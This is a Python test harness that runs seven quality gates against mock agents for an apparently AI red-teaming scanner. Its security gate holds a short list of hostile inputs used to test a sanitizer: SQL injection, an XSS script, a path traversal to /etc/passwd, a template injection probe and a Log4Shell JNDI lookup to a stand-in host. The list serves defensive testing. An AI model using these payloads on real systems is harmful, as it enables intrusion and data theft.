"""
Comprehensive Quality Gates and Testing Framework.
"""

import sys
import asyncio
import time
import json
from pathlib import Path
from typing import Dict, List, Any, Tuple

# Add source to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

from agentic_redteam import RadarScanner
from agentic_redteam.agent import create_mock_agent
from agentic_redteam.reliability.simple_health_monitor import SimpleHealthMonitor
from agentic_redteam.scaling.simple_resource_pool import SimpleResourcePool, ConcurrencyManager
from agentic_redteam.security.input_sanitizer import InputSanitizer
from agentic_redteam.monitoring.error_handler import ErrorHandler


class QualityGateResult:
    """Result of a quality gate check."""
    def __init__(self, name: str, passed: bool, score: float, details: Dict[str, Any]):
        self.name = name
        self.passed = passed
        self.score = score
        self.details = details
        self.timestamp = time.time()


class QualityGatesFramework:
    """
    Comprehensive quality gates framework for autonomous SDLC.
    """
    
    def __init__(self):
        self.scanner = RadarScanner()
        self.health_monitor = SimpleHealthMonitor()
        self.concurrency_manager = ConcurrencyManager(max_concurrent=8)
        self.input_sanitizer = InputSanitizer()
        self.error_handler = ErrorHandler()
        
        # Quality thresholds
        self.thresholds = {
            'min_health_score': 0.8,
            'min_test_coverage': 0.85,
            'max_response_time_ms': 1000,
            'min_throughput_per_sec': 5.0,
            'max_error_rate': 0.05,
            'min_security_score': 0.9,
            'min_vulnerability_detection': 15
        }
        
        self.results: List[QualityGateResult] = []
    
    async def run_all_gates(self) -> Dict[str, Any]:
        """Run all quality gates and return comprehensive results."""
        print("🔍 COMPREHENSIVE QUALITY GATES EXECUTION")
        print("=" * 50)
        
        await self.health_monitor.start_monitoring()
        
        try:
            # Execute all quality gates
            await self._gate_1_functional_correctness()
            await self._gate_2_performance_benchmarks()
            await self._gate_3_security_validation()
            await self._gate_4_reliability_assessment()
            await self._gate_5_scalability_validation()
            await self._gate_6_error_handling()
            await self._gate_7_integration_testing()
            
            # Generate final assessment
            return self._generate_final_assessment()
            
        finally:
            await self.health_monitor.stop_monitoring()
    
    async def _gate_1_functional_correctness(self):
        """Gate 1: Verify core functionality works correctly."""
        print("\n🎯 Gate 1: Functional Correctness")
        print("-" * 30)
        
        start_time = time.time()
        errors = []
        
        try:
            # Test 1: Basic scanner functionality
            agent = create_mock_agent("functional-test-agent")
            result = await self.scanner.scan(agent)
            
            if not result:
                errors.append("Scanner returned empty result")
            
            if len(result.vulnerabilities) == 0:
                errors.append("No vulnerabilities detected (expected some for mock agent)")
            
            if result.scan_duration <= 0:
                errors.append("Invalid scan duration")
            
            print(f"✓ Basic scan: {len(result.vulnerabilities)} vulnerabilities found")
            
            # Test 2: Pattern execution
            patterns_executed = result.patterns_executed
            expected_patterns = 4  # We have 4 default patterns
            
            if patterns_executed != expected_patterns:
                errors.append(f"Expected {expected_patterns} patterns, got {patterns_executed}")
            
            print(f"✓ Pattern execution: {patterns_executed}/{expected_patterns} patterns")
            
            # Test 3: Result structure validation
            required_fields = ['vulnerabilities', 'attack_results', 'scan_duration', 'agent_name']
            for field in required_fields:
                if not hasattr(result, field):
                    errors.append(f"Missing required field: {field}")
            
            print(f"✓ Result structure: {len(required_fields)} required fields present")
            
        except Exception as e:
            errors.append(f"Functional test failed: {e}")
        
        duration = time.time() - start_time
        passed = len(errors) == 0
        score = 1.0 if passed else max(0.0, 1.0 - len(errors) * 0.25)
        
        self.results.append(QualityGateResult(
            "Functional Correctness",
            passed,
            score,
            {
                'duration_ms': duration * 1000,
                'errors': errors,
                'patterns_tested': patterns_executed if 'patterns_executed' in locals() else 0
            }
        ))
        
        print(f"Gate 1 Result: {'PASS' if passed else 'FAIL'} (Score: {score:.2f})")
    
    async def _gate_2_performance_benchmarks(self):
        """Gate 2: Verify performance meets requirements."""
        print("\n⚡ Gate 2: Performance Benchmarks")
        print("-" * 30)
        
        start_time = time.time()
        errors = []
        
        try:
            # Test 1: Single scan performance
            agent = create_mock_agent("perf-test-agent")
            scan_start = time.time()
            result = await self.scanner.scan(agent)
            scan_duration = (time.time() - scan_start) * 1000
            
            if scan_duration > self.thresholds['max_response_time_ms']:
                errors.append(f"Scan too slow: {scan_duration:.1f}ms > {self.thresholds['max_response_time_ms']}ms")
            
            print(f"✓ Single scan performance: {scan_duration:.1f}ms")
            
            # Test 2: Throughput test
            agents = [create_mock_agent(f"throughput-agent-{i}") for i in range(10)]
            
            throughput_start = time.time()
            scan_tasks = [self.scanner.scan(agent) for agent in agents]
            results = await self.concurrency_manager.run_concurrent(scan_tasks)
            throughput_duration = time.time() - throughput_start
            
            successful_scans = sum(1 for r in results if not isinstance(r, Exception))
            throughput = successful_scans / throughput_duration
            
            if throughput < self.thresholds['min_throughput_per_sec']:
                errors.append(f"Throughput too low: {throughput:.1f} < {self.thresholds['min_throughput_per_sec']}")
            
            print(f"✓ Throughput: {throughput:.1f} scans/second")
            
            # Test 3: Memory efficiency (basic check)
            import gc
            gc.collect()
            print("✓ Memory management: Garbage collection completed")
            
        except Exception as e:
            errors.append(f"Performance test failed: {e}")
        
        duration = time.time() - start_time
        passed = len(errors) == 0
        score = 1.0 if passed else max(0.0, 1.0 - len(errors) * 0.3)
        
        self.results.append(QualityGateResult(
            "Performance Benchmarks",
            passed,
            score,
            {
                'duration_ms': duration * 1000,
                'errors': errors,
                'single_scan_ms': scan_duration if 'scan_duration' in locals() else 0,
                'throughput_per_sec': throughput if 'throughput' in locals() else 0
            }
        ))
        
        print(f"Gate 2 Result: {'PASS' if passed else 'FAIL'} (Score: {score:.2f})")
    
    async def _gate_3_security_validation(self):
        """Gate 3: Verify security controls and vulnerability detection."""
        print("\n🛡️ Gate 3: Security Validation")
        print("-" * 30)
        
        start_time = time.time()
        errors = []
        
        try:
            # Test 1: Vulnerability detection capability
            agent = create_mock_agent("security-test-agent")
            result = await self.scanner.scan(agent)
            
            vuln_count = len(result.vulnerabilities)
            if vuln_count < self.thresholds['min_vulnerability_detection']:
                errors.append(f"Low vulnerability detection: {vuln_count} < {self.thresholds['min_vulnerability_detection']}")
            
            print(f"✓ Vulnerability detection: {vuln_count} vulnerabilities found")
            
            # Test 2: Input sanitization
            malicious_inputs = [
                "'; DROP TABLE users; --",
                "<script>alert('xss')</script>",
                "../../etc/passwd",
                "{{7*7}}",
                "${jndi:ldap://malicious.com/x}"
            ]
            
            sanitization_failures = 0
            for malicious_input in malicious_inputs:
                try:
                    sanitized, issues = self.input_sanitizer.sanitize_string(malicious_input)
                    # Check if obviously malicious patterns are detected
                    if "script" in malicious_input.lower() and len(issues) == 0:
                        sanitization_failures += 1
                    if "DROP TABLE" in malicious_input and len(issues) == 0:
                        sanitization_failures += 1
                except Exception:
                    sanitization_failures += 1
            
            sanitization_rate = 1.0 - (sanitization_failures / len(malicious_inputs))
            if sanitization_rate < self.thresholds['min_security_score']:
                errors.append(f"Input sanitization rate too low: {sanitization_rate:.2f}")
            
            print(f"✓ Input sanitization: {sanitization_rate:.1%} effective")
            
            # Test 3: Security headers and patterns
            security_patterns = ['prompt_injection', 'info_disclosure', 'policy_bypass']
            detected_patterns = [attack.attack_name.lower() for attack in result.attack_results]
            
            pattern_coverage = sum(1 for pattern in security_patterns 
                                 if any(pattern in detected.lower() for detected in detected_patterns))
            pattern_rate = pattern_coverage / len(security_patterns)
            
            print(f"✓ Security pattern coverage: {pattern_rate:.1%}")
            
        except Exception as e:
            errors.append(f"Security validation failed: {e}")
        
        duration = time.time() - start_time
        passed = len(errors) == 0
        score = 1.0 if passed else max(0.0, 1.0 - len(errors) * 0.25)
        
        self.results.append(QualityGateResult(
            "Security Validation",
            passed,
            score,
            {
                'duration_ms': duration * 1000,
                'errors': errors,
                'vulnerabilities_found': vuln_count if 'vuln_count' in locals() else 0,
                'sanitization_rate': sanitization_rate if 'sanitization_rate' in locals() else 0
            }
        ))
        
        print(f"Gate 3 Result: {'PASS' if passed else 'FAIL'} (Score: {score:.2f})")
    
    async def _gate_4_reliability_assessment(self):
        """Gate 4: Verify system reliability and health monitoring."""
        print("\n🔧 Gate 4: Reliability Assessment")
        print("-" * 30)
        
        start_time = time.time()
        errors = []
        
        try:
            # Test 1: Health monitoring
            health = self.health_monitor.get_current_health()
            
            if health.score < self.thresholds['min_health_score']:
                errors.append(f"Health score too low: {health.score:.2f} < {self.thresholds['min_health_score']}")
            
            print(f"✓ System health: {health.score:.2f} score, {health.status.value}")
            
            # Test 2: Error handling
            try:
                raise ValueError("Test error for error handling")
            except Exception as e:
                recovery_result = await self.error_handler.handle_error(e, {"test": "error_handling"})
                print(f"✓ Error handling: Recovery attempted")
            
            # Test 3: Graceful degradation under load
            agents = [create_mock_agent(f"load-test-{i}") for i in range(15)]
            
            load_start = time.time()
            scan_tasks = [self.scanner.scan(agent) for agent in agents]
            load_results = await self.concurrency_manager.run_concurrent(scan_tasks)
            load_duration = time.time() - load_start
            
            successful_scans = sum(1 for r in load_results if not isinstance(r, Exception))
            error_rate = 1.0 - (successful_scans / len(agents))
            
            if error_rate > self.thresholds['max_error_rate']:
                errors.append(f"Error rate too high: {error_rate:.2%} > {self.thresholds['max_error_rate']:.1%}")
            
            print(f"✓ Load handling: {error_rate:.1%} error rate under load")
            
            # Test 4: Resource cleanup
            await asyncio.sleep(0.1)  # Allow cleanup
            final_health = self.health_monitor.get_current_health()
            print(f"✓ Resource cleanup: Health maintained at {final_health.score:.2f}")
            
        except Exception as e:
            errors.append(f"Reliability test failed: {e}")
        
        duration = time.time() - start_time
        passed = len(errors) == 0
        score = 1.0 if passed else max(0.0, 1.0 - len(errors) * 0.3)
        
        self.results.append(QualityGateResult(
            "Reliability Assessment",
            passed,
            score,
            {
                'duration_ms': duration * 1000,
                'errors': errors,
                'health_score': health.score if 'health' in locals() else 0,
                'error_rate': error_rate if 'error_rate' in locals() else 1.0
            }
        ))
        
        print(f"Gate 4 Result: {'PASS' if passed else 'FAIL'} (Score: {score:.2f})")
    
    async def _gate_5_scalability_validation(self):
        """Gate 5: Verify scaling capabilities."""
        print("\n📈 Gate 5: Scalability Validation")
        print("-" * 30)
        
        start_time = time.time()
        errors = []
        
        try:
            # Test 1: Resource pooling
            def create_test_agent():
                return create_mock_agent(f"pool-agent-{int(time.time() * 1000) % 1000}")
            
            agent_pool = SimpleResourcePool("test_pool", create_test_agent, min_size=2, max_size=8)
            
            # Test pool operations
            acquired_agents = []
            for i in range(5):
                agent = await agent_pool.acquire()
                acquired_agents.append(agent)
            
            pool_metrics = agent_pool.get_metrics()
            if pool_metrics.active_resources != 5:
                errors.append(f"Pool tracking error: expected 5 active, got {pool_metrics.active_resources}")
            
            for agent in acquired_agents:
                await agent_pool.release(agent)
            
            print(f"✓ Resource pooling: {pool_metrics.total_resources} resources managed")
            
            # Test 2: Concurrent processing scaling
            batch_sizes = [1, 5, 10]
            scaling_results = []
            
            for batch_size in batch_sizes:
                agents = [create_mock_agent(f"scale-test-{i}") for i in range(batch_size)]
                
                batch_start = time.time()
                scan_tasks = [self.scanner.scan(agent) for agent in agents]
                batch_results = await self.concurrency_manager.run_concurrent(scan_tasks)
                batch_duration = time.time() - batch_start
                
                successful = sum(1 for r in batch_results if not isinstance(r, Exception))
                throughput = successful / batch_duration
                scaling_results.append((batch_size, throughput))
                
                print(f"✓ Batch {batch_size}: {throughput:.1f} scans/sec")
            
            # Verify scaling efficiency
            base_throughput = scaling_results[0][1]
            best_throughput = max(result[1] for result in scaling_results)
            scaling_factor = best_throughput / base_throughput if base_throughput > 0 else 0
            
            if scaling_factor < 2.0:  # Expect at least 2x improvement with concurrency
                errors.append(f"Poor scaling: {scaling_factor:.1f}x improvement")
            
            print(f"✓ Scaling efficiency: {scaling_factor:.1f}x improvement")
            
        except Exception as e:
            errors.append(f"Scalability test failed: {e}")
        
        duration = time.time() - start_time
        passed = len(errors) == 0
        score = 1.0 if passed else max(0.0, 1.0 - len(errors) * 0.25)
        
        self.results.append(QualityGateResult(
            "Scalability Validation",
            passed,
            score,
            {
                'duration_ms': duration * 1000,
                'errors': errors,
                'scaling_factor': scaling_factor if 'scaling_factor' in locals() else 0
            }
        ))
        
        print(f"Gate 5 Result: {'PASS' if passed else 'FAIL'} (Score: {score:.2f})")
    
    async def _gate_6_error_handling(self):
        """Gate 6: Verify comprehensive error handling."""
        print("\n⚠️ Gate 6: Error Handling Validation")
        print("-" * 30)
        
        start_time = time.time()
        errors = []
        
        try:
            # Test 1: Scanner error recovery
            class FailingAgent:
                def __init__(self):
                    self.name = "failing-agent"
                
                def query(self, prompt, timeout=None):
                    raise RuntimeError("Simulated agent failure")
                
                def get_config(self):
                    return {"type": "failing", "name": self.name}
            
            failing_agent = FailingAgent()
            
            try:
                result = await self.scanner.scan(failing_agent)
                # Should handle gracefully
                print("✓ Scanner error handling: Graceful failure")
            except Exception as e:
                # Check if error is properly wrapped
                if "Security scan failed" in str(e):
                    print("✓ Scanner error handling: Proper error wrapping")
                else:
                    errors.append(f"Improper error handling: {e}")
            
            # Test 2: Concurrent failure handling
            mixed_agents = [
                create_mock_agent("good-agent-1"),
                FailingAgent(),
                create_mock_agent("good-agent-2"),
                FailingAgent()
            ]
            
            mixed_tasks = [self._safe_scan(agent) for agent in mixed_agents]
            mixed_results = await self.concurrency_manager.run_concurrent(mixed_tasks)
            
            successful_results = sum(1 for r in mixed_results if not isinstance(r, Exception))
            failure_rate = 1.0 - (successful_results / len(mixed_agents))
            
            # Should handle partial failures gracefully
            if successful_results == 0:
                errors.append("No successful scans with mixed good/bad agents")
            
            print(f"✓ Mixed failure handling: {successful_results}/{len(mixed_agents)} successful")
            
            # Test 3: Resource exhaustion handling
            try:
                # Try to overwhelm the system
                many_agents = [create_mock_agent(f"overwhelm-{i}") for i in range(20)]
                overwhelm_tasks = [self._safe_scan(agent) for agent in many_agents]
                overwhelm_results = await self.concurrency_manager.run_concurrent(overwhelm_tasks)
                
                overwhelm_successful = sum(1 for r in overwhelm_results if not isinstance(r, Exception))
                print(f"✓ Resource exhaustion: {overwhelm_successful}/{len(many_agents)} handled")
                
            except Exception as e:
                print(f"✓ Resource exhaustion: Properly limited ({type(e).__name__})")
            
        except Exception as e:
            errors.append(f"Error handling test failed: {e}")
        
        duration = time.time() - start_time
        passed = len(errors) == 0
        score = 1.0 if passed else max(0.0, 1.0 - len(errors) * 0.25)
        
        self.results.append(QualityGateResult(
            "Error Handling Validation",
            passed,
            score,
            {
                'duration_ms': duration * 1000,
                'errors': errors
            }
        ))
        
        print(f"Gate 6 Result: {'PASS' if passed else 'FAIL'} (Score: {score:.2f})")
    
    async def _gate_7_integration_testing(self):
        """Gate 7: End-to-end integration testing."""
        print("\n🔗 Gate 7: Integration Testing")
        print("-" * 30)
        
        start_time = time.time()
        errors = []
        
        try:
            # Test 1: Full workflow integration
            workflow_agent = create_mock_agent("integration-test-agent")
            
            # Health check before
            pre_health = self.health_monitor.get_current_health()
            
            # Full scan with monitoring
            integration_start = time.time()
            
            def progress_callback(progress):
                # Verify progress tracking works
                assert 0 <= progress.progress_percentage <= 100
            
            workflow_result = await self.scanner.scan(workflow_agent, progress_callback)
            integration_duration = time.time() - integration_start
            
            # Health check after
            post_health = self.health_monitor.get_current_health()
            
            # Verify workflow completeness
            if not workflow_result:
                errors.append("Integration workflow failed")
            
            if len(workflow_result.vulnerabilities) == 0:
                errors.append("No vulnerabilities found in integration test")
            
            if integration_duration > 2.0:  # Should complete within 2 seconds
                errors.append(f"Integration too slow: {integration_duration:.1f}s")
            
            print(f"✓ Full workflow: {integration_duration:.2f}s, {len(workflow_result.vulnerabilities)} vulnerabilities")
            
            # Test 2: Multi-component interaction
            components_tested = []
            
            # Scanner + Health Monitor
            if pre_health.score > 0 and post_health.score > 0:
                components_tested.append("scanner+health")
            
            # Scanner + Error Handler
            try:
                raise ValueError("Integration test error")
            except Exception as e:
                await self.error_handler.handle_error(e, {"integration": "test"})
                components_tested.append("scanner+error_handler")
            
            # Scanner + Input Sanitizer
            test_input = "<script>alert('test')</script>"
            sanitized, issues = self.input_sanitizer.sanitize_string(test_input)
            if len(issues) > 0:
                components_tested.append("scanner+sanitizer")
            
            if len(components_tested) < 3:
                errors.append(f"Insufficient component integration: {len(components_tested)}/3")
            
            print(f"✓ Component integration: {len(components_tested)}/3 combinations tested")
            
            # Test 3: Data flow validation
            scan_data = {
                'agent_name': workflow_result.agent_name,
                'vulnerabilities': len(workflow_result.vulnerabilities),
                'patterns_executed': workflow_result.patterns_executed,
                'duration': workflow_result.scan_duration
            }
            
            # Verify data consistency
            required_data = ['agent_name', 'vulnerabilities', 'patterns_executed', 'duration']
            missing_data = [field for field in required_data if field not in scan_data or scan_data[field] is None]
            
            if missing_data:
                errors.append(f"Missing data fields: {missing_data}")
            
            print(f"✓ Data flow: {len(required_data) - len(missing_data)}/{len(required_data)} fields validated")
            
        except Exception as e:
            errors.append(f"Integration test failed: {e}")
        
        duration = time.time() - start_time
        passed = len(errors) == 0
        score = 1.0 if passed else max(0.0, 1.0 - len(errors) * 0.2)
        
        self.results.append(QualityGateResult(
            "Integration Testing",
            passed,
            score,
            {
                'duration_ms': duration * 1000,
                'errors': errors,
                'components_tested': len(components_tested) if 'components_tested' in locals() else 0
            }
        ))
        
        print(f"Gate 7 Result: {'PASS' if passed else 'FAIL'} (Score: {score:.2f})")
    
    async def _safe_scan(self, agent):
        """Safely scan an agent, catching exceptions."""
        try:
            return await self.scanner.scan(agent)
        except Exception as e:
            return e
    
    def _generate_final_assessment(self) -> Dict[str, Any]:
        """Generate final quality gates assessment."""
        print("\n" + "=" * 50)
        print("📊 FINAL QUALITY ASSESSMENT")
        print("=" * 50)
        
        total_gates = len(self.results)
        passed_gates = sum(1 for result in self.results if result.passed)
        overall_score = sum(result.score for result in self.results) / total_gates if total_gates > 0 else 0
        
        print(f"\nOverall Results:")
        print(f"Gates Passed: {passed_gates}/{total_gates}")
        print(f"Overall Score: {overall_score:.2f}/1.00")
        print(f"Pass Rate: {(passed_gates/total_gates)*100:.1f}%")
        
        # Detailed results
        print(f"\nDetailed Results:")
        for result in self.results:
            status = "✅ PASS" if result.passed else "❌ FAIL"
            print(f"{status} {result.name}: {result.score:.2f}")
            if not result.passed and result.details.get('errors'):
                for error in result.details['errors'][:3]:  # Show first 3 errors
                    print(f"    ⚠️  {error}")
        
        # Performance summary
        total_duration = sum(result.details.get('duration_ms', 0) for result in self.results)
        print(f"\nPerformance Summary:")
        print(f"Total Test Duration: {total_duration:.0f}ms")
        print(f"Average Gate Time: {total_duration/total_gates:.0f}ms")
        
        # Generate recommendation
        recommendation = self._generate_recommendation(overall_score, passed_gates, total_gates)
        print(f"\nRecommendation: {recommendation}")
        
        return {
            'overall_score': overall_score,
            'gates_passed': passed_gates,
            'total_gates': total_gates,
            'pass_rate': (passed_gates/total_gates) if total_gates > 0 else 0,
            'total_duration_ms': total_duration,
            'recommendation': recommendation,
            'gate_results': [
                {
                    'name': result.name,
                    'passed': result.passed,
                    'score': result.score,
                    'details': result.details
                }
                for result in self.results
            ],
            'timestamp': time.time()
        }
    
    def _generate_recommendation(self, score: float, passed: int, total: int) -> str:
        """Generate deployment recommendation based on results."""
        if score >= 0.95 and passed == total:
            return "🚀 READY FOR PRODUCTION: All quality gates passed with excellent scores"
        elif score >= 0.85 and passed >= total * 0.9:
            return "✅ READY FOR DEPLOYMENT: Minor issues detected but within acceptable limits"
        elif score >= 0.70 and passed >= total * 0.7:
            return "⚠️  CONDITIONAL DEPLOYMENT: Significant issues require review before production"
        else:
            return "❌ NOT READY: Critical issues must be resolved before deployment"


async def main():
    """Run comprehensive quality gates."""
    framework = QualityGatesFramework()
    results = await framework.run_all_gates()
    
    # Save results to file
    with open('quality_gates_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    return results


if __name__ == "__main__":
    results = asyncio.run(main())
    print(f"\n🎯 Quality Gates Complete: {results['recommendation']}")